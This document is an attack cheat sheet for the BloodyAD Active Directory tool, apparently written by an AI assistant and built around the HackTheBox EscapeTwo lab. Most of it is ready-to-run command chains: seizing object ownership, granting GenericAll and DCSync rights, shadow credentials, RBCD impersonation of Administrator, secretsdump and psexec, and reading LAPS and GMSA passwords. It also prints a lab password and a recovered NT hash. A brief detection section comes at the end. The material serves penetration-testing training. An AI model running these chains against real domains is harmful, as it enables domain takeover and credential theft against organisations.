I'll search for information about BloodyAD and the HTB writeup to create a comprehensive cheat sheet.# 🩸 BloodyAD Cheat Sheet

> **Active Directory Privilege Escalation Framework**  
> A powerful LDAP/SAMR-based toolkit for AD enumeration and exploitation

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Installation](#-installation)
- [Authentication Methods](#-authentication-methods)
- [Command Structure](#-command-structure)
- [Quick Reference](#-quick-reference)
- [Common Operations](#-common-operations)
- [Privilege Escalation Techniques](#-privilege-escalation-techniques)
- [Exploitation Workflows](#-exploitation-workflows)
- [Flag Reference Table](#-flag-reference-table)
- [HTB EscapeTwo Workflow](#-htb-escapetwo-workflow)

---

## 🎯 Overview

**BloodyAD** is an Active Directory privilege escalation framework that performs LDAP/SAMR calls to domain controllers. It's particularly useful for:

- 🔍 **Enumeration**: Query AD objects, attributes, and permissions
- 🔐 **Privilege Escalation**: Exploit weak ACLs and permissions
- 🎭 **Credential Operations**: Password changes, shadow credentials
- 🔧 **Object Manipulation**: Modify user/computer/group attributes
- 🌐 **Multi-Domain Operations**: Cross-domain enumeration and attacks

### Key Features

✅ Multiple authentication methods (password, hash, ticket, certificate)  
✅ LDAP/LDAPS/SAMR protocol support  
✅ SOCKS proxy compatibility  
✅ Cross-platform (Linux, macOS, Windows)  
✅ No LDAPS required for sensitive operations  

---

## 💿 Installation

```bash
# Clone repository
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD

# Install dependencies
pip install --break-system-packages .

# Verify installation
bloodyAD --help
```

> ⚠️ **Note**: On Kali Linux, BloodyAD is pre-installed and can be run directly.

---

## 🔑 Authentication Methods

### Cleartext Password
```bash
bloodyAD --host <DC_IP> -d <domain> -u <username> -p '<password>' <command>
```

### Pass-the-Hash
```bash
bloodyAD --host <DC_IP> -d <domain> -u <username> -p ':<NTLM_hash>' <command>
```

### Pass-the-Ticket (Kerberos)
```bash
export KRB5CCNAME=/path/to/ticket.ccache
bloodyAD --host <DC_FQDN> -d <domain> -u <username> -k <command>
```

### Certificate Authentication
```bash
bloodyAD --host <DC_IP> -d <domain> -u <username> -c '/path/to/key:/path/to/cert' <command>
```

### LDAPS (Secure LDAP)
```bash
bloodyAD --host <DC_IP> -d <domain> -u <username> -p '<password>' -s <command>
```

---

## 📝 Command Structure

```
bloodyAD [connection_options] [command] [subcommand] [arguments]
```

### Connection Options

| Flag | Description | Example |
|------|-------------|---------|
| `--host` | DC hostname or IP | `--host 10.10.11.51` |
| `-d` | Domain name | `-d sequel.htb` |
| `-u` | Username | `-u ryan` |
| `-p` | Password or hash | `-p 'Pass123!'` or `-p ':NTHASH'` |
| `-k` | Use Kerberos authentication | `-k` |
| `-c` | Certificate authentication | `-c 'key.pem:cert.pem'` |
| `-s` | Use LDAPS (secure) | `-s` |
| `--dc-ip` | DC IP (for Kerberos) | `--dc-ip 10.10.11.51` |

---

## ⚡ Quick Reference

### 🔎 Enumeration Commands

```bash
# Get specific object attributes
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <target> --attr <attribute>

# Get all children of DN
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get children '<DN>' --type <user|computer|group>

# Search for objects
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get search --filter '<LDAP_filter>'

# Get writable objects
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get writable

# Get DNS dump
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get dnsDump
```

### ✏️ Modification Commands

```bash
# Change user password
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' set password <target> '<new_password>'

# Set object owner
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' set owner <target> <new_owner>

# Modify object attribute
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' set object <target> <attribute> -v '<value>'
```

### ➕ Addition Commands

```bash
# Add user to group
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' add groupMember <group> <member>

# Grant GenericAll permission
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' add genericAll <target> <trustee>

# Add shadow credentials
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' add shadowCredentials <target>

# Add DCSync rights
bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' add dcsync <trustee>
```

---

## 🔧 Common Operations

### 👤 User Enumeration

```bash
# Get all domain users
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get children 'DC=sequel,DC=htb' --type user

# Get specific user info
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object administrator

# Get user's group memberships
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object ryan --attr memberOf

# Get UserAccountControl flags
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object ryan --attr userAccountControl
```

### 💻 Computer Enumeration

```bash
# Get all domain computers
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get children 'DC=sequel,DC=htb' --type computer

# Get computer LAPS password
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object 'DC01$' --attr ms-Mcs-AdmPwd

# Get machine account quota
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object 'DC=sequel,DC=htb' --attr ms-DS-MachineAccountQuota
```

### 👥 Group Operations

```bash
# Get group members
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object 'Domain Admins' --attr member

# Add user to group
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add groupMember 'Domain Admins' ryan

# Remove user from group
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' remove groupMember 'Domain Admins' ryan
```

### 🔐 Password Operations

```bash
# Change user password
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set password target_user 'NewPass123!'

# Force password change at next logon
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set object target_user pwdLastSet -v 0

# Set password never expires
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add uac target_user -f DONT_EXPIRE_PASSWD
```

### 🎭 GMSA Password Retrieval

```bash
# Read GMSA password (requires permissions)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object 'gmsa_account$' --attr msDS-ManagedPassword

# Get raw GMSA password
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get object 'gmsa_account$' --attr msDS-ManagedPassword --raw
```

---

## 🚀 Privilege Escalation Techniques

### 1️⃣ WriteOwner → Full Control

When you have `WriteOwner` permission on an object:

```bash
# Step 1: Change owner to yourself
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set owner ca_svc ryan

# Step 2: Grant yourself GenericAll
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add genericAll ca_svc ryan
```

> 💡 **Use Case**: HTB EscapeTwo uses this exact technique to compromise the `ca_svc` account!

### 2️⃣ GenericAll → Various Attack Paths

With `GenericAll` permissions, you can:

#### A. Change Password
```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set password victim_user 'NewPassword123!'
```

#### B. Add Shadow Credentials
```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add shadowCredentials victim_user
```

#### C. Kerberoasting Attack
```bash
# Add SPN
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set object victim_user servicePrincipalName -v 'HTTP/fake.sequel.htb'

# Request TGS (using GetUserSPNs.py)
GetUserSPNs.py sequel.htb/ryan:'Pass123!' -request-user victim_user

# Remove SPN (cleanup)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set object victim_user servicePrincipalName
```

#### D. ASREPRoasting
```bash
# Enable DONT_REQ_PREAUTH
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add uac victim_user -f DONT_REQ_PREAUTH

# Request AS-REP (using GetNPUsers.py)
GetNPUsers.py sequel.htb/victim_user -no-pass

# Disable DONT_REQ_PREAUTH (cleanup)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' remove uac victim_user -f DONT_REQ_PREAUTH
```

### 3️⃣ WriteDACL → DCSync

```bash
# Grant DCSync rights
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add dcsync ryan

# Perform DCSync attack
secretsdump.py sequel.htb/ryan:'Pass123!'@10.10.11.51
```

### 4️⃣ GenericWrite → Delegation Attacks

#### Unconstrained Delegation
```bash
# Add TRUSTED_FOR_DELEGATION flag
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add uac computer$ -f TRUSTED_FOR_DELEGATION
```

#### Constrained Delegation
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add uac service_account -f TRUSTED_TO_AUTH_FOR_DELEGATION

# Set allowed delegation targets
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set object service_account msDS-AllowedToDelegateTo -v "CIFS/dc01.sequel.htb"
```

#### Resource-Based Constrained Delegation (RBCD)
```bash
# Add RBCD permission
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add rbcd 'TARGET$' 'ATTACKER$'
```

### 5️⃣ Account Manipulation

```bash
# Enable disabled account
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' remove uac target_user -f ACCOUNTDISABLE

# Disable account
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add uac target_user -f ACCOUNTDISABLE
```

---

## 🎯 Exploitation Workflows

### Workflow 1: WriteOwner to Compromise (HTB EscapeTwo)

```bash
# Scenario: ryan has WriteOwner on ca_svc

# Step 1: Enumerate permissions (optional)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' get object ca_svc --resolve-sd

# Step 2: Take ownership
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan

# Step 3: Grant full control
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan

# Step 4: Add shadow credentials
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -dc-ip 10.10.11.51

# Result: NT hash retrieved for ca_svc
```

### Workflow 2: GenericAll to Domain Admin

```bash
# Scenario: Attacker has GenericAll on Domain Controller

# Step 1: Create computer account
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add computer ATTACKER$ 'Pass123!'

# Step 2: Configure RBCD
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add rbcd 'DC01$' 'ATTACKER$'

# Step 3: Get TGT and impersonate admin
getST.py -spn cifs/dc01.sequel.htb sequel.htb/ATTACKER$:'Pass123!' -impersonate Administrator

# Step 4: Use ticket for access
export KRB5CCNAME=Administrator.ccache
psexec.py sequel.htb/Administrator@dc01.sequel.htb -k -no-pass
```

### Workflow 3: Shadow Credentials Attack

```bash
# Scenario: GenericAll or GenericWrite on target

# Step 1: Add shadow credentials
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add shadowCredentials target_user

# Step 2: Authenticate using certificate (automatically done by Certipy)
certipy shadow auto -u ryan@sequel.htb -p 'Pass123!' -account target_user -dc-ip 10.10.11.51

# Alternative: Manual certificate usage
# bloodyAD generates cert.pem and key.pem
gettgtpkinit.py sequel.htb/target_user -cert-pem cert.pem -key-pem key.pem target_user.ccache
```

### Workflow 4: DNS Manipulation

```bash
# Add DNS record (for ADIDNS poisoning)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add dnsRecord attacker-machine 10.10.14.6

# Remove DNS record (cleanup)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' remove dnsRecord attacker-machine 10.10.14.6

# Dump all DNS records
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
```

---

## 📊 Flag Reference Table

### Main Commands

| Command | Description |
|---------|-------------|
| `get` | Retrieve information from AD |
| `set` | Modify attributes/settings |
| `add` | Add permissions, users, objects |
| `remove` | Remove permissions, users, objects |

### GET Subcommands

| Subcommand | Description | Example |
|------------|-------------|---------|
| `object` | Get object attributes | `get object ryan --attr memberOf` |
| `children` | List child objects | `get children 'DC=sequel,DC=htb' --type user` |
| `search` | LDAP search query | `get search --filter '(objectClass=user)'` |
| `writable` | Find writable objects | `get writable --detail` |
| `dnsDump` | Export DNS records | `get dnsDump` |
| `trusts` | Show domain trusts | `get trusts` |

### SET Subcommands

| Subcommand | Description | Example |
|------------|-------------|---------|
| `password` | Change user password | `set password ryan 'NewPass123!'` |
| `owner` | Change object owner | `set owner ca_svc ryan` |
| `object` | Modify object attribute | `set object ryan description -v "Admin User"` |
| `restore` | Restore deleted object | `set restore deleted_user` |

### ADD Subcommands

| Subcommand | Description | Example |
|------------|-------------|---------|
| `genericAll` | Grant full control | `add genericAll target_object trustee` |
| `groupMember` | Add user to group | `add groupMember 'Domain Admins' ryan` |
| `shadowCredentials` | Add Key Credentials | `add shadowCredentials target_user` |
| `dcsync` | Grant DCSync rights | `add dcsync ryan` |
| `rbcd` | Configure RBCD | `add rbcd 'TARGET$' 'ATTACKER$'` |
| `dnsRecord` | Add DNS entry | `add dnsRecord hostname 10.10.14.6` |
| `uac` | Add UAC flag | `add uac user -f DONT_REQ_PREAUTH` |
| `computer` | Create computer account | `add computer EVIL$ 'Pass123!'` |
| `user` | Create user account | `add user eviluser 'Pass123!'` |

### REMOVE Subcommands

| Subcommand | Description | Example |
|------------|-------------|---------|
| `genericAll` | Remove full control | `remove genericAll target trustee` |
| `groupMember` | Remove from group | `remove groupMember 'Domain Admins' ryan` |
| `shadowCredentials` | Remove Key Credentials | `remove shadowCredentials target` |
| `dcsync` | Remove DCSync rights | `remove dcsync ryan` |
| `rbcd` | Remove RBCD config | `remove rbcd 'TARGET$' 'ATTACKER$'` |
| `dnsRecord` | Remove DNS entry | `remove dnsRecord hostname 10.10.14.6` |
| `uac` | Remove UAC flag | `remove uac user -f ACCOUNTDISABLE` |
| `object` | Delete object | `remove object eviluser` |

### UserAccountControl (UAC) Flags

| Flag | Description | Add/Remove |
|------|-------------|------------|
| `ACCOUNTDISABLE` | Account is disabled | Enable: `remove`, Disable: `add` |
| `DONT_REQ_PREAUTH` | No Kerberos pre-auth (ASREPRoast) | `add` or `remove` |
| `DONT_EXPIRE_PASSWD` | Password never expires | `add` or `remove` |
| `TRUSTED_FOR_DELEGATION` | Unconstrained delegation | `add` or `remove` |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Constrained delegation | `add` or `remove` |
| `PASSWD_NOTREQD` | No password required | `add` or `remove` |
| `NORMAL_ACCOUNT` | Normal user account | `add` or `remove` |
| `WORKSTATION_TRUST_ACCOUNT` | Computer account | `add` or `remove` |

### Common Attributes

| Attribute | Description | Example Usage |
|-----------|-------------|---------------|
| `memberOf` | Group memberships | `get object ryan --attr memberOf` |
| `userAccountControl` | UAC flags | `get object ryan --attr userAccountControl` |
| `servicePrincipalName` | Service Principal Names | `set object user servicePrincipalName -v 'HTTP/web'` |
| `msDS-AllowedToDelegateTo` | Constrained delegation targets | `set object user msDS-AllowedToDelegateTo -v 'CIFS/dc'` |
| `msDS-ManagedPassword` | GMSA password | `get object 'gmsa$' --attr msDS-ManagedPassword` |
| `ms-Mcs-AdmPwd` | LAPS password | `get object 'PC$' --attr ms-Mcs-AdmPwd` |
| `ms-DS-MachineAccountQuota` | Machine account quota | `get object 'DC=domain,DC=htb' --attr ms-DS-MachineAccountQuota` |
| `pwdLastSet` | Last password change | `set object user pwdLastSet -v 0` |
| `description` | Object description | `set object user description -v "text"` |
| `userPrincipalName` | User Principal Name | `set object user userPrincipalName -v '[email protected]'` |

### Additional Options

| Option | Description |
|--------|-------------|
| `--attr` | Specify attribute(s) to retrieve |
| `--type` | Filter by object type (user/computer/group) |
| `--resolve-sd` | Resolve security descriptors |
| `--detail` | Show detailed output |
| `--raw` | Return raw data |
| `-f` | UAC flag to add/remove |
| `-v` | Value to set |

---

## 🏆 HTB EscapeTwo Workflow

### Context
In HTB EscapeTwo, the user `ryan` has `WriteOwner` permission on the `ca_svc` service account. The goal is to escalate privileges by taking ownership and adding shadow credentials.

### Step-by-Step Exploitation

```bash
# 1. Initial enumeration (optional)
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' get object ca_svc --resolve-sd

# 2. Change owner from Domain Admins to ryan
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan

# Output: [+] Old owner S-1-5-21-...-512 is now replaced by ryan on ca_svc

# 3. Grant ryan GenericAll permission on ca_svc
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan

# Output: [+] ryan has now GenericAll on ca_svc

# 4. Add shadow credentials to ca_svc (using Certipy)
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -dc-ip 10.10.11.51

# Output: NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce

# 5. Verify hash works
netexec smb 10.10.11.51 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
```

### Why This Works

1. **WriteOwner** → Allows changing the object owner
2. **Owner Rights** → Object owner can modify the object's DACL
3. **GenericAll** → Full control enables shadow credentials attack
4. **Shadow Credentials** → Retrieves NT hash without password change

### Key Commands Breakdown

#### `set owner`
```bash
bloodyAD [auth] set owner <target> <new_owner>
```
- **target**: Object to take ownership of (sAMAccountName, DN, or SID)
- **new_owner**: Who becomes the new owner (sAMAccountName, DN, or SID)

#### `add genericAll`
```bash
bloodyAD [auth] add genericAll <target> <trustee>
```
- **target**: Object to grant permissions on
- **trustee**: Principal receiving permissions

---

## 🔍 When to Use BloodyAD

### ✅ Best Use Cases

1. **WriteOwner/Owns Permission**
   - Change object ownership
   - Escalate to full control

2. **GenericAll/GenericWrite Permission**
   - Modify object attributes
   - Add shadow credentials
   - Configure delegation

3. **WriteDACL Permission**
   - Grant yourself additional permissions
   - Add DCSync rights

4. **Complex Privilege Escalation Paths**
   - Multi-step attacks requiring ACL manipulation
   - BloodHound-identified attack paths

5. **Enumeration Tasks**
   - Query specific attributes
   - Find writable objects
   - Enumerate permissions

### ⚠️ Alternatives to Consider

- **Certipy**: Dedicated shadow credentials tool (simpler for this specific attack)
- **PowerView**: Windows-native AD enumeration
- **Impacket suite**: Specific attack scripts (secretsdump, getST, etc.)
- **ldapsearch**: Basic LDAP queries
- **NetExec/CrackMapExec**: Broader AD enumeration and exploitation

---

## 🛡️ Defensive Considerations

### Detection Opportunities

- Monitor for ownership changes on sensitive accounts
- Alert on GenericAll/WriteDACL modifications
- Track shadow credential additions (Key Credentials)
- Log UAC flag changes
- Monitor SPN modifications

### Best Practices

- Regularly audit ACLs on privileged accounts
- Limit WriteOwner/WriteDACL permissions
- Use Protected Users group for sensitive accounts
- Enable advanced auditing for ACL changes
- Monitor for unusual LDAP queries

---

## 📚 Additional Resources

- [Official Wiki](https://github.com/CravateRouge/bloodyAD/wiki)
- [HTB EscapeTwo Writeup by 0xdf](https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html)
- [Access Control Documentation](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control)
- [Autobloody for BloodHound Integration](https://github.com/CravateRouge/autobloody)

---

## 💡 Pro Tips

1. **Always enumerate first**: Use `get object --resolve-sd` to understand current permissions
2. **Test in lab environments**: Practice complex attack chains before production
3. **Clean up after yourself**: Remove shadow credentials and restore UAC flags
4. **Combine with BloodHound**: Use autobloody for automated exploitation
5. **Use LDAPS when possible**: Add `-s` flag for encrypted communications
6. **Keep detailed notes**: Track ownership changes and permission modifications

---

**Created for HTB: EscapeTwo Lab** | **Tool Version: Latest** | **Happy Hacking! 🚀**
